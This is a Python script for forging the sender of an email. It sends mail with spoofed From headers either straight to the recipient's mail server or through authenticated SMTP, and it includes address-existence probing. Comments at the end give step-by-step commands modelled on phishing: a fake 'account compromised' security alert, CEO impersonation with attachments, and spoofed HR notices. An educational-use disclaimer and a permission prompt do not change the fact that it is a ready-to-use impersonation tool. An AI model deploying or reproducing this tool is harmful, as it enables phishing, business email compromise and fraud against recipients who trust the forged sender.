#!/usr/bin/env python3
"""
Advanced Email Temper (Spoofing/Tampering) Tool
For Educational and Authorized Security Testing Only
WARNING: Unauthorized email spoofing is ILLEGAL in most jurisdictions
"""

import smtplib
import ssl
import argparse
import sys
import json
import logging
import re
import time
import random
import base64
import hashlib
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders, utils
from email.header import Header
from email.utils import formataddr, parseaddr, formatdate
from typing import Dict, List, Tuple, Optional, Any
import dns.resolver
import socket
from urllib.parse import urlparse
import requests
import subprocess
import tempfile
import os

# Configuration
DEFAULT_TIMEOUT = 30
MAX_HEADER_LENGTH = 2000
ALLOWED_ENCODINGS = ['utf-8', 'iso-8859-1', 'ascii']

class EmailHeaderManipulator:
    """Advanced email header manipulation and spoofing"""
    
    # Common email headers that can be spoofed
    SPOOFABLE_HEADERS = [
        'From', 'To', 'Cc', 'Bcc', 'Reply-To', 
        'Subject', 'Message-ID', 'Date', 
        'Organization', 'X-Priority', 'X-MSMail-Priority',
        'X-Mailer', 'User-Agent', 'X-Originating-IP',
        'X-Originating-Email', 'X-Sender', 'X-Apparently-To'
    ]
    
    # Common mail user agents
    MAIL_USER_AGENTS = [
        'Microsoft Outlook 16.0',
        'Microsoft Outlook 19.0',
        'Apple Mail (2.3608.120.23)',
        'Mozilla Thunderbird 78.10.1',
        'Gmail (iOS)',
        'Gmail (Android)',
        'Outlook for iOS',
        'Outlook for Android',
        'Yahoo Mail 6.0',
        'Spark 2.8.3',
        'Airmail 4.0',
        'Edison Mail 1.4.1'
    ]
    
    # Common email clients and their X-Mailer values
    X_MAILERS = {
        'gmail': 'Gmail',
        'outlook': 'Microsoft Outlook',
        'apple': 'Apple Mail',
        'thunderbird': 'Mozilla Thunderbird',
        'yahoo': 'Yahoo Mail',
        'custom': None
    }
    
    @classmethod
    def generate_message_id(cls, domain: str = None) -> str:
        """Generate a realistic Message-ID"""
        if not domain:
            domain = 'example.com'
        timestamp = int(time.time())
        random_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        return f"<{timestamp}.{random_id}@{domain}>"
    
    @classmethod
    def generate_email_from_name(cls, name: str = None) -> Tuple[str, str]:
        """Generate email with display name"""
        if not name:
            first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 
                          'Robert', 'Lisa', 'William', 'Karen', 'James', 'Patricia']
            last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 
                         'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
            name = f"{random.choice(first_names)} {random.choice(last_names)}"
        return name
    
    @classmethod
    def create_spoofed_email(cls, sender_name: str, sender_email: str, 
                           recipient_email: str, subject: str, body: str,
                           reply_to: str = None, cc: List[str] = None,
                           bcc: List[str] = None, custom_headers: Dict = None,
                           html_body: str = None, attachments: List[str] = None,
                           priority: str = 'normal') -> MIMEMultipart:
        """Create a spoofed email with custom headers"""
        
        # Create message
        msg = MIMEMultipart('alternative')
        
        # Set basic headers
        if sender_name:
            msg['From'] = formataddr((str(Header(sender_name, 'utf-8')), sender_email))
        else:
            msg['From'] = sender_email
        
        msg['To'] = recipient_email
        msg['Subject'] = Header(subject, 'utf-8')
        
        # Set Date header
        msg['Date'] = formatdate(localtime=True)
        
        # Generate and set Message-ID
        domain = sender_email.split('@')[1] if '@' in sender_email else 'example.com'
        msg['Message-ID'] = cls.generate_message_id(domain)
        
        # Set Reply-To if provided
        if reply_to:
            msg['Reply-To'] = reply_to
        
        # Set CC if provided
        if cc:
            msg['Cc'] = ', '.join(cc)
        
        # Set BCC if provided (sent as header but may not be used by all servers)
        if bcc:
            msg['Bcc'] = ', '.join(bcc)
        
        # Set priority
        priority_values = {
            'high': ('1', 'High'),
            'normal': ('3', 'Normal'),
            'low': ('5', 'Low')
        }
        if priority in priority_values:
            msg['X-Priority'] = priority_values[priority][0]
            msg['X-MSMail-Priority'] = priority_values[priority][1]
        
        # Set X-Mailer
        msg['X-Mailer'] = random.choice(cls.MAIL_USER_AGENTS)
        
        # Add custom headers
        if custom_headers:
            for key, value in custom_headers.items():
                if key not in ['From', 'To', 'Subject', 'Date', 'Message-ID']:
                    msg[key] = value
        
        # Add body parts
        if html_body:
            # Add plain text alternative
            text_part = MIMEText(body, 'plain', 'utf-8')
            msg.attach(text_part)
            
            # Add HTML part
            html_part = MIMEText(html_body, 'html', 'utf-8')
            msg.attach(html_part)
        else:
            # Only plain text
            text_part = MIMEText(body, 'plain', 'utf-8')
            msg.attach(text_part)
        
        # Add attachments
        if attachments:
            for file_path in attachments:
                try:
                    with open(file_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{os.path.basename(file_path)}"'
                        )
                        msg.attach(part)
                except Exception as e:
                    print(f"Warning: Failed to attach {file_path}: {e}")
        
        return msg

class EmailValidator:
    """Validate and verify email addresses and domains"""
    
    @staticmethod
    def validate_email(email: str) -> bool:
        """Validate email format"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email))
    
    @staticmethod
    def validate_domain(domain: str) -> bool:
        """Validate domain has MX records"""
        try:
            dns.resolver.resolve(domain, 'MX')
            return True
        except:
            return False
    
    @staticmethod
    def verify_domain(domain: str) -> Dict:
        """Get detailed domain information"""
        result = {
            'valid': False,
            'mx_records': [],
            'spf_record': None,
            'dkim_record': None,
            'dmarc_record': None
        }
        
        try:
            # Get MX records
            mx_records = dns.resolver.resolve(domain, 'MX')
            result['mx_records'] = [str(r.exchange) for r in mx_records]
            
            # Check SPF
            try:
                spf = dns.resolver.resolve(domain, 'TXT')
                for r in spf:
                    if 'v=spf1' in str(r):
                        result['spf_record'] = str(r)
                        break
            except:
                pass
            
            # Check DMARC
            try:
                dmarc = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
                for r in dmarc:
                    if 'v=DMARC1' in str(r):
                        result['dmarc_record'] = str(r)
                        break
            except:
                pass
            
            result['valid'] = True
            
        except Exception as e:
            print(f"Domain verification error: {e}")
        
        return result

class EmailTemper:
    """Main Email Temper class for spoofing and tampering"""
    
    def __init__(self, smtp_server: str = None, smtp_port: int = None,
                 use_ssl: bool = False, username: str = None, 
                 password: str = None, verbose: bool = False):
        
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port or (465 if use_ssl else 587)
        self.use_ssl = use_ssl
        self.username = username
        self.password = password
        self.verbose = verbose
        self.results = []
        
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.DEBUG if self.verbose else logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('email_temper.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def test_connection(self) -> bool:
        """Test SMTP connection"""
        try:
            if self.use_ssl:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, timeout=DEFAULT_TIMEOUT)
            else:
                server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=DEFAULT_TIMEOUT)
            
            if not self.use_ssl:
                server.starttls()
            
            if self.username and self.password:
                server.login(self.username, self.password)
            
            server.quit()
            self.logger.info(f"SMTP connection test successful to {self.smtp_server}:{self.smtp_port}")
            return True
            
        except Exception as e:
            self.logger.error(f"SMTP connection test failed: {e}")
            return False
    
    def send_spoofed_email(self, sender_name: str, sender_email: str,
                          recipient_email: str, subject: str, body: str,
                          reply_to: str = None, cc: List[str] = None,
                          bcc: List[str] = None, html_body: str = None,
                          attachments: List[str] = None,
                          custom_headers: Dict = None,
                          priority: str = 'normal',
                          use_open_relay: bool = False) -> Dict:
        """Send a spoofed email"""
        
        result = {
            'success': False,
            'message': '',
            'timestamp': datetime.now().isoformat(),
            'sender': sender_email,
            'recipient': recipient_email,
            'subject': subject
        }
        
        try:
            # Validate inputs
            if not use_open_relay:
                if not self.smtp_server or not self.username or not self.password:
                    raise ValueError("SMTP server, username, and password required for authenticated sending")
            
            # Validate recipient
            if not EmailValidator.validate_email(recipient_email):
                raise ValueError(f"Invalid recipient email: {recipient_email}")
            
            # Create spoofed email
            msg = EmailHeaderManipulator.create_spoofed_email(
                sender_name=sender_name,
                sender_email=sender_email,
                recipient_email=recipient_email,
                subject=subject,
                body=body,
                reply_to=reply_to,
                cc=cc,
                bcc=bcc,
                html_body=html_body,
                attachments=attachments,
                custom_headers=custom_headers,
                priority=priority
            )
            
            # Send email
            if use_open_relay:
                # Use direct SMTP to target's MX server (open relay technique)
                self.send_direct_mx(msg, recipient_email)
            else:
                # Use configured SMTP server
                self.send_authenticated(msg)
            
            result['success'] = True
            result['message'] = 'Email sent successfully'
            self.logger.info(f"Email spoofed and sent to {recipient_email}")
            
        except Exception as e:
            result['message'] = str(e)
            self.logger.error(f"Failed to send spoofed email: {e}")
        
        self.results.append(result)
        return result
    
    def send_authenticated(self, msg: MIMEMultipart):
        """Send email using authenticated SMTP"""
        try:
            if self.use_ssl:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(self.smtp_server, self.smtp_port, timeout=DEFAULT_TIMEOUT)
            else:
                server = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=DEFAULT_TIMEOUT)
            
            if not self.use_ssl:
                server.starttls()
            
            if self.username and self.password:
                server.login(self.username, self.password)
            
            # Get recipient from message (to, cc, bcc)
            recipients = []
            for header in ['To', 'Cc', 'Bcc']:
                if msg[header]:
                    recipients.extend([addr.strip() for addr in msg[header].split(',') if addr.strip()])
            
            if not recipients:
                raise ValueError("No recipients specified")
            
            server.send_message(msg, from_addr=msg['From'], to_addrs=recipients)
            server.quit()
            
        except Exception as e:
            raise Exception(f"SMTP sending failed: {e}")
    
    def send_direct_mx(self, msg: MIMEMultipart, target_email: str):
        """Send email directly to target's MX server (open relay technique)"""
        try:
            domain = target_email.split('@')[1]
            
            # Get MX records
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_host = str(mx_records[0].exchange)
            
            # Connect directly to MX server
            server = smtplib.SMTP(mx_host, 25, timeout=DEFAULT_TIMEOUT)
            server.helo()
            
            # Send email
            recipients = [target_email]
            if msg['Cc']:
                recipients.extend([addr.strip() for addr in msg['Cc'].split(',') if addr.strip()])
            if msg['Bcc']:
                recipients.extend([addr.strip() for addr in msg['Bcc'].split(',') if addr.strip()])
            
            server.send_message(msg, from_addr=msg['From'], to_addrs=recipients)
            server.quit()
            
        except Exception as e:
            raise Exception(f"Direct MX sending failed: {e}")
    
    def test_deliverability(self, email: str) -> Dict:
        """Test if an email address is deliverable"""
        
        result = {
            'email': email,
            'valid_format': False,
            'valid_domain': False,
            'mx_records': [],
            'deliverable': False,
            'risk_score': 0,
            'recommendation': ''
        }
        
        # Check format
        if not EmailValidator.validate_email(email):
            result['recommendation'] = 'Invalid email format'
            return result
        result['valid_format'] = True
        
        # Check domain
        domain = email.split('@')[1]
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            result['mx_records'] = [str(r.exchange) for r in mx_records]
            result['valid_domain'] = True
        except:
            result['recommendation'] = 'Domain has no MX records'
            return result
        
        # Check deliverability (attempt connection to MX)
        try:
            for mx in result['mx_records'][:3]:  # Try first 3 MX servers
                try:
                    server = smtplib.SMTP(str(mx), 25, timeout=5)
                    server.helo()
                    server.mail('test@example.com')
                    code, message = server.rcpt(email)
                    server.quit()
                    
                    if code == 250:
                        result['deliverable'] = True
                        result['risk_score'] = 10
                        result['recommendation'] = 'Email is deliverable'
                        break
                    elif code == 550 or code == 553:
                        result['deliverable'] = False
                        result['risk_score'] = 90
                        result['recommendation'] = 'Email does not exist'
                        break
                except:
                    continue
        except Exception as e:
            result['risk_score'] = 50
            result['recommendation'] = f'Unable to verify: {str(e)}'
        
        return result
    
    def analyze_email(self, email_content: str) -> Dict:
        """Analyze email for spoofing indicators"""
        
        analysis = {
            'spoofing_indicators': [],
            'authenticity_score': 100,
            'headers': {},
            'warnings': []
        }
        
        # Parse headers
        lines = email_content.split('\n')
        current_header = None
        header_value = []
        
        for line in lines:
            if line.startswith(' ') or line.startswith('\t'):
                if current_header:
                    header_value.append(line.strip())
            elif ':' in line:
                if current_header:
                    analysis['headers'][current_header] = ' '.join(header_value)
                current_header, value = line.split(':', 1)
                header_value = [value.strip()]
            else:
                if current_header:
                    analysis['headers'][current_header] = ' '.join(header_value)
                break
        
        if current_header:
            analysis['headers'][current_header] = ' '.join(header_value)
        
        # Check for spoofing indicators
        # Check Received headers
        received_count = len([h for h in analysis['headers'].keys() if h.lower() == 'received'])
        if received_count > 0:
            analysis['spoofing_indicators'].append(f'{received_count} Received headers found')
        
        # Check for SPF, DKIM, DMARC
        if 'Received-SPF' in analysis['headers']:
            if 'pass' not in analysis['headers']['Received-SPF'].lower():
                analysis['spoofing_indicators'].append('SPF check failed')
                analysis['authenticity_score'] -= 20
        
        if 'Authentication-Results' in analysis['headers']:
            auth_results = analysis['headers']['Authentication-Results']
            if 'spf=pass' not in auth_results.lower():
                analysis['spoofing_indicators'].append('SPF authentication may have failed')
                analysis['authenticity_score'] -= 10
            if 'dkim=pass' not in auth_results.lower():
                analysis['spoofing_indicators'].append('DKIM authentication may have failed')
                analysis['authenticity_score'] -= 10
            if 'dmarc=pass' not in auth_results.lower():
                analysis['spoofing_indicators'].append('DMARC authentication may have failed')
                analysis['authenticity_score'] -= 10
        
        # Check for suspicious headers
        suspicious_headers = ['X-Priority', 'X-MSMail-Priority', 'X-Mailer']
        for header in suspicious_headers:
            if header in analysis['headers']:
                analysis['spoofing_indicators'].append(f'Suspicious header found: {header}')
                analysis['authenticity_score'] -= 5
        
        # Generate warnings
        if analysis['authenticity_score'] < 80:
            analysis['warnings'].append('Email shows signs of spoofing')
        if analysis['authenticity_score'] < 60:
            analysis['warnings'].append('Email is likely spoofed')
        if analysis['authenticity_score'] < 40:
            analysis['warnings'].append('Email is almost certainly spoofed')
        
        return analysis
    
    def save_report(self, filename: str = None):
        """Save results to file"""
        if not filename:
            filename = f"email_temper_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'smtp_server': self.smtp_server,
            'smtp_port': self.smtp_port,
            'use_ssl': self.use_ssl,
            'username': self.username,
            'results': self.results
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Report saved to {filename}")
        return filename

def load_template(filename: str) -> Dict:
    """Load email template from file"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
        
        # Parse template (simple format: subject and body separated by ---)
        parts = content.split('---')
        template = {
            'subject': parts[0].strip() if parts else 'Test Email',
            'body': parts[1].strip() if len(parts) > 1 else 'This is a test email.',
            'html_body': parts[2].strip() if len(parts) > 2 else None
        }
        return template
    except Exception as e:
        print(f"Error loading template: {e}")
        return None

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(
        description='Advanced Email Temper Tool - For Educational Use Only',
        epilog='WARNING: Unauthorized email spoofing is ILLEGAL. Use only on systems you own or have permission to test.'
    )
    
    # Required arguments
    parser.add_argument('-s', '--sender', required=True, help='Sender email address (spoofed)')
    parser.add_argument('-n', '--name', help='Sender display name')
    parser.add_argument('-r', '--recipient', required=True, help='Recipient email address')
    parser.add_argument('-sb', '--subject', help='Email subject')
    parser.add_argument('-b', '--body', help='Email body text')
    
    # SMTP configuration
    parser.add_argument('--smtp-server', help='SMTP server (for authenticated sending)')
    parser.add_argument('--smtp-port', type=int, default=587, help='SMTP port')
    parser.add_argument('--ssl', action='store_true', help='Use SSL for SMTP connection')
    parser.add_argument('--username', help='SMTP username (if required)')
    parser.add_argument('--password', help='SMTP password (if required)')
    parser.add_argument('--open-relay', action='store_true', 
                       help='Use open relay technique (direct to MX)')
    
    # Additional headers
    parser.add_argument('--reply-to', help='Reply-To address')
    parser.add_argument('--cc', nargs='+', help='CC recipients')
    parser.add_argument('--bcc', nargs='+', help='BCC recipients')
    parser.add_argument('--priority', choices=['high', 'normal', 'low'], 
                       default='normal', help='Email priority')
    
    # Content options
    parser.add_argument('--html', help='HTML body content')
    parser.add_argument('--template', help='Email template file (subject---body---html)')
    parser.add_argument('--attachments', nargs='+', help='Files to attach')
    parser.add_argument('--custom-headers', nargs='+', help='Custom headers (key:value)')
    
    # Options
    parser.add_argument('--test-connection', action='store_true', help='Test SMTP connection')
    parser.add_argument('--deliverability', help='Test deliverability of an email address')
    parser.add_argument('--analyze', help='Analyze email file for spoofing indicators')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    parser.add_argument('--output', help='Output report file')
    
    args = parser.parse_args()
    
    # Print banner
    print("\n" + "="*70)
    print("ADVANCED EMAIL TEMPER (SPOOFING/TAMPERING) TOOL")
    print("FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY")
    print("="*70 + "\n")
    
    # Handle deliverability test
    if args.deliverability:
        print(f"Testing deliverability of: {args.deliverability}")
        tester = EmailTemper(verbose=args.verbose)
        result = tester.test_deliverability(args.deliverability)
        print(json.dumps(result, indent=2))
        sys.exit(0)
    
    # Handle email analysis
    if args.analyze:
        print(f"Analyzing email file: {args.analyze}")
        try:
            with open(args.analyze, 'r') as f:
                content = f.read()
            tester = EmailTemper(verbose=args.verbose)
            analysis = tester.analyze_email(content)
            print(json.dumps(analysis, indent=2))
        except Exception as e:
            print(f"Error analyzing email: {e}")
        sys.exit(0)
    
    # Validate sender and recipient
    if not EmailValidator.validate_email(args.sender):
        print(f"Error: Invalid sender email: {args.sender}")
        sys.exit(1)
    
    if not EmailValidator.validate_email(args.recipient):
        print(f"Error: Invalid recipient email: {args.recipient}")
        sys.exit(1)
    
    # Load template if provided
    if args.template:
        template = load_template(args.template)
        if template:
            args.subject = args.subject or template.get('subject')
            args.body = args.body or template.get('body')
            args.html = args.html or template.get('html_body')
    
    # Validate inputs
    if not args.subject:
        args.subject = "Test Email"
    if not args.body:
        args.body = "This is a test email sent using Email Temper tool."
    
    # Parse custom headers
    custom_headers = {}
    if args.custom_headers:
        for header in args.custom_headers:
            if ':' in header:
                key, value = header.split(':', 1)
                custom_headers[key.strip()] = value.strip()
    
    # Create EmailTemper instance
    temper = EmailTemper(
        smtp_server=args.smtp_server,
        smtp_port=args.smtp_port,
        use_ssl=args.ssl,
        username=args.username,
        password=args.password,
        verbose=args.verbose
    )
    
    # Test connection if requested
    if args.test_connection:
        if temper.test_connection():
            print("SMTP connection test: SUCCESS")
        else:
            print("SMTP connection test: FAILED")
        sys.exit(0)
    
    # Confirm with user
    print("Configuration Summary:")
    print(f"  Sender: {args.sender} ({args.name or 'No name'})")
    print(f"  Recipient: {args.recipient}")
    print(f"  Subject: {args.subject}")
    print(f"  Priority: {args.priority}")
    print(f"  SMTP Server: {args.smtp_server or 'Direct MX (open relay)'}")
    print(f"  Attachments: {args.attachments or 'None'}")
    print("\n" + "="*70)
    
    confirm = input("Are you sure you have permission to spoof this email? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Operation cancelled.")
        sys.exit(0)
    
    # Send spoofed email
    try:
        result = temper.send_spoofed_email(
            sender_name=args.name or args.sender.split('@')[0],
            sender_email=args.sender,
            recipient_email=args.recipient,
            subject=args.subject,
            body=args.body,
            reply_to=args.reply_to,
            cc=args.cc,
            bcc=args.bcc,
            html_body=args.html,
            attachments=args.attachments,
            custom_headers=custom_headers,
            priority=args.priority,
            use_open_relay=args.open_relay
        )
        
        if result['success']:
            print("\n✓ Email sent successfully!")
            print(f"  To: {args.recipient}")
            print(f"  From: {args.sender} ({args.name or 'No name'})")
            print(f"  Subject: {args.subject}")
        else:
            print(f"\n✗ Failed to send email: {result['message']}")
        
        # Save report
        report_file = temper.save_report(args.output)
        print(f"\nReport saved to: {report_file}")
        
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()


# =============================================================================
# USAGE EXAMPLES - STEP BY STEP GUIDE
# =============================================================================

# 1. INSTALLATION & SETUP
# =============================================================================
# # Install required dependencies
# pip install dnspython requests
# 
# # Save the script as email_temper.py
# # Make it executable (Linux/Mac)
# chmod +x email_temper.py


# 2. BASIC USAGE EXAMPLES
# =============================================================================

# Example 1: Send a Simple Spoofed Email (Direct MX - Open Relay)
# =============================================================================
# python email_temper.py \
#     -s spoofed@example.com \
#     -n "John Doe" \
#     -r target@victim.com \
#     -sb "Important Message" \
#     -b "This is a test message" \
#     --open-relay


# Example 2: Send Spoofed Email via Authenticated SMTP
# =============================================================================
# python email_temper.py \
#     -s spoofed@gmail.com \
#     -n "Jane Smith" \
#     -r target@example.com \
#     -sb "Security Alert" \
#     -b "Your account has been compromised" \
#     --smtp-server smtp.gmail.com \
#     --smtp-port 587 \
#     --username your_real_email@gmail.com \
#     --password your_app_password


# Example 3: Send with HTML Body and Attachments
# =============================================================================
# python email_temper.py \
#     -s ceo@company.com \
#     -n "CEO Name" \
#     -r employee@company.com \
#     -sb "Important Document" \
#     -b "Please review the attached document" \
#     --html "<h1>Important</h1><p>Please review</p>" \
#     --attachments document.pdf image.jpg \
#     --open-relay


# Example 4: Send with CC, BCC, and Reply-To
# =============================================================================
# python email_temper.py \
#     -s hr@company.com \
#     -r employee@company.com \
#     -sb "HR Notification" \
#     -b "Your request has been processed" \
#     --cc manager@company.com \
#     --bcc admin@company.com \
#     --reply-to hr-department@company.com \
#     --smtp-server smtp.company.com \
#     --username hr@company.com \
#     --password secure_password


# Example 5: Using Template File
# =============================================================================
# # Create template file (template.txt):
# # Subject: Important Update
# # ---
# # Body text here
# # ---
# # <h1>HTML version</h1>
# 
# python email_temper.py \
#     -s system@company.com \
#     -r user@company.com \
#     --template template.txt \
#     --open-relay


# Example 6: Test Email Deliverability
# =============================================================================
# python email_temper.py --deliverability test@example.com


# Example 7: Analyze Email for Spoofing Indicators
# =============================================================================
# python email_temper.py --analyze suspicious_email.eml


# Example 8: Test SMTP Connection
# =============================================================================
# python email_temper.py \
#     --smtp-server smtp.gmail.com \
#     --smtp-port 587 \
#     --username test@gmail.com \
#     --password password \
#     --test-connection


# 3. ADVANCED USAGE EXAMPLES
# =============================================================================

# Example 9: Send with Priority and Custom Headers
# =============================================================================
# python email_temper.py \
#     -s executive@company.com \
#     -r team@company.com \
#     -sb "Urgent Meeting" \
#     -b "Meeting at 3 PM" \
#     --priority high \
#     --custom-headers "X-Company:Acme" "X-Department:IT" \
#     --open-relay


# Example 10: Batch Sending with CC
# =============================================================================
# python email_temper.py \
#     -s marketing@company.com \
#     -r customers@company.com \
#     -sb "Newsletter" \
#     -b "Check out our new products" \
#     --cc user1@example.com user2@example.com user3@example.com \
#     --smtp-server smtp.company.com \
#     --username marketing@company.com \
#     --password password123


# 4. GMAIL/GOOGLE APPS SETUP
# =============================================================================
# # For Gmail, you need to use App Password:
# # 1. Enable 2-Factor Authentication on your Google Account
# # 2. Generate App Password:
# #    - Go to Google Account → Security → 2-Step Verification
# #    - Scroll to bottom → App passwords
# #    - Select "Mail" and "Other (Custom name)"
# #    - Copy generated password
# # 3. Use the App Password in the command


# 5. TESTING ON LOCAL SMTP SERVER
# =============================================================================
# # Install MailHog for testing (Mac)
# brew install mailhog
# mailhog
# 
# # Or use Python's built-in SMTP debug server
# python -m smtpd -n -c DebuggingServer localhost:1025
# 
# # Then send through local server
# python email_temper.py \
#     -s test@local.com \
#     -r recipient@local.com \
#     -sb "Local Test" \
#     -b "This is a local test" \
#     --smtp-server localhost \
#     --smtp-port 1025 \
#     --open-relay


# 6. TROUBLESHOOTING
# =============================================================================
# # Issue: Connection refused
# # Solution: Check SMTP server/port; try open relay mode
# 
# # Issue: Authentication failed
# # Solution: Use App Password for Gmail; check credentials
# 
# # Issue: Email not delivered
# # Solution: Check spam folder; verify SPF/DKIM policies
# 
# # Issue: Open relay failing
# # Solution: Some ISPs block port 25; try port 587
# 
# # Issue: SSL/TLS errors
# # Solution: Try different SSL settings; use starttls


# 7. OUTPUT FILES
# =============================================================================
# # email_temper.log - Detailed log file
# # email_temper_report_*.json - JSON report with all results
# # Custom output file specified with --output


# 8. DISCLAIMER
# =============================================================================
# # This tool is designed for:
# # - Security professionals testing their own systems
# # - Penetration testing with explicit permission
# # - Educational purposes in controlled environments
# #
# # WARNING: Unauthorized email spoofing is ILLEGAL in most countries
# # Use only on email addresses you own or have explicit permission to test